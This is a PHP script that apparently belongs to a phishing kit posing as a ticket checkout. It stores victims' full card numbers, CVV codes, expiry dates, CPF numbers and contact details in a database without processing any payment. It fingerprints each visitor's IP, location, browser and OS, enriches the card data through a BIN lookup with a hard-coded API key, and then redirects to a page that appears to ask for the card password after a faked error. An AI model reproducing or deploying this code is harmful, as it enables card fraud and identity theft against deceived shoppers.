<?php

session_start();
require_once 'init.php';

function getUserIP()
{
	if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
		$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
		$_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote  = $_SERVER['REMOTE_ADDR'];

	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	} else {
		$ip = $remote;
	}

	return $ip;
}

$ip = getUserIP();
// $ip = "2804:14c:bbad:6413:dd01:5061:e6fc:6fb";
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$userAgent = getUserAgent();
$sistema = getOS();
$navegador = getBrowser();
$dispositivo = isMobile() ? "MOBILE" : "DESKTOP";
$host =  gethostbyaddr($ip);
$localizacao = getGeo($ip);
$cidade_loca = isset($localizacao) && isset($localizacao->city) ? $localizacao->city : "-";
$estado_loca = isset($localizacao) && isset($localizacao->regionName) ? $localizacao->regionName : "-";
$pais_loca = isset($localizacao) && isset($localizacao->country) ? $localizacao->country : "-";
$data = date("H:i:s d/m/Y");

$origem = $_POST['origem'];
$destino = $_POST['destino'];
$valorTotal = $_POST['valorTotal'];
$quantidade = $_POST['quantidade'];
$nome = $_POST['mkNome'];
$email = $_POST['mkEmail'];
$telefone = $_POST['mkTelefone'];
$cpf = $_POST['mkCpf'];
$tipoPagamento = "CC";

$numerocc = $_POST['numerocc'];
$sem = str_replace(' ', '', $numerocc);
$bin = substr($sem, 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_VERBOSE, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, 'https://api.bincodes.com/bin/?format=json&api_key=893a92319fb7e53f4dabb8ea23773bff&bin=' . $bin);
$resultado = curl_exec($ch);
$array = json_decode($resultado, true);
$bin = $array['bin'];
$banco_cc = $array['bank'];
$bandeira_cc = $array['card'];
$tipo = $array['type'];
$categoria_cc = $array['level'];
$pais_cc = $array['country'];
$codigo_cc = $array['countrycode'];
$validadecc = $_POST['validadecc'];
$cvvcc = $_POST['cvvcc'];
$titularcc = $_POST['titularcc'];
$cpfcc = $_POST['cpfcc'];
$parcelascc = $_POST['parcelascc'];

$PDO = db_connect();
$sql = "INSERT INTO vendas(origem, destino, valorTotal, quantidade, nome, email, telefone, cpf, tipoPagamento, numerocc, banco_cc, bandeira_cc, categoria_cc, pais_cc, validadecc, cvvcc, titularcc, cpfcc, parcelascc, ip, pais_loca, estado_loca, cidade_loca, sistema, navegador, data, notificacao)VALUES(:origem, :destino, :valorTotal, :quantidade, :nome, :email, :telefone, :cpf, :tipoPagamento, :numerocc, :banco_cc, :bandeira_cc, :categoria_cc, :pais_cc, :validadecc, :cvvcc, :titularcc, :cpfcc, :parcelascc, :ip, :pais_loca, :estado_loca, :cidade_loca, :sistema, :navegador, :data, :notificacao)";
$stmt = $PDO->prepare($sql);
$stmt->bindParam(':origem', $origem);
$stmt->bindParam(':destino', $destino);
$stmt->bindParam(':valorTotal', $valorTotal);
$stmt->bindParam(':quantidade', $quantidade);
$stmt->bindParam(':nome', $nome);
$stmt->bindParam(':email', $email);
$stmt->bindParam(':telefone', $telefone);
$stmt->bindParam(':cpf', $cpf);
$stmt->bindParam(':tipoPagamento', $tipoPagamento);
$stmt->bindParam(':numerocc', $numerocc);
$stmt->bindParam(':banco_cc', $banco_cc);
$stmt->bindParam(':bandeira_cc', $bandeira_cc);
$stmt->bindParam(':categoria_cc', $categoria_cc);
$stmt->bindParam(':pais_cc', $pais_cc);
$stmt->bindParam(':validadecc', $validadecc);
$stmt->bindParam(':cvvcc', $cvvcc);
$stmt->bindParam(':titularcc', $titularcc);
$stmt->bindParam(':cpfcc', $cpfcc);
$stmt->bindParam(':parcelascc', $parcelascc);
$stmt->bindParam(':ip', $ip);
$stmt->bindParam(':pais_loca', $pais_loca);
$stmt->bindParam(':estado_loca', $estado_loca);
$stmt->bindParam(':cidade_loca', $cidade_loca);
$stmt->bindParam(':sistema', $sistema);
$stmt->bindParam(':navegador', $navegador);
$stmt->bindParam(':data', $data);
$stmt->bindParam(':notificacao', $notificacao);

if ($stmt->execute()) {
	// include("mkEnviaPedidoEmail.php");
	$clientId = $PDO->lastInsertId();
	echo "<script>location='../../senhacc.php?clientId=$clientId&status=erro';</script>";
	echo "deu certo";
	
} else {
	print_r($stmt->errorInfo());
}
